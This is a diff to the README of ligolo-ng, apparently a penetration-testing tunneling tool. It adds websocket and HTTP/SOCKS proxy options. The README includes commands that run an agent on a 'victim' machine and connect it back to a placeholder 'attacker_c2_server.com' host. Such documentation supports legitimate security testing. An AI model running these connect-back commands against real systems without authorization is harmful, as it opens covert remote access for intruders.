@@ -132,6 +132,11 @@ $ ./proxy -h # Help options
 $ ./proxy -autocert # Automatically request LetsEncrypt certificates
 $ ./proxy -selfcert # Use self-signed certificates
 ```
+For using websocket protocol start the *proxy* server with `https://` prefix
+```shell
+$ ./proxy -selfcert https://0.0.0.0:8443 # Use self-signed certificates
+```
+
 
 ### TLS Options
 
@@ -182,7 +187,16 @@ Start the *agent* on your target (victim) computer (no privileges are required!)
 $ ./agent -connect attacker_c2_server.com:11601
 ```
 
-> If you want to tunnel the connection over a SOCKS5 proxy, you can use the `--socks ip:port` option. You can specify SOCKS credentials using the `--socks-user` and `--socks-pass` arguments.
+You can use websocket connection to ligolo-ng proxy by adding https:// prefix (by default 443 port will be used):
+```shell
+$ ./agent -connect https://attacker_c2_server.com
+$ ./agent -connect https://attacker_c2_server.com:8443
+```
+
+> If you want to tunnel the connection over a SOCKS5/HTTP proxy, you can use the `--proxy schema://username:password@ip:port` option. 
+> Examples: `--proxy http://127.0.0.1:8080`, `--proxy http://admin:secret@127.0.0.1:8080`, `--proxy socks5://admin:secret@127.0.0.1:1080`
+> 
+> HTTP proxy can be used only with websocket protocol.
 
 A session should appear on the *proxy* server.
 
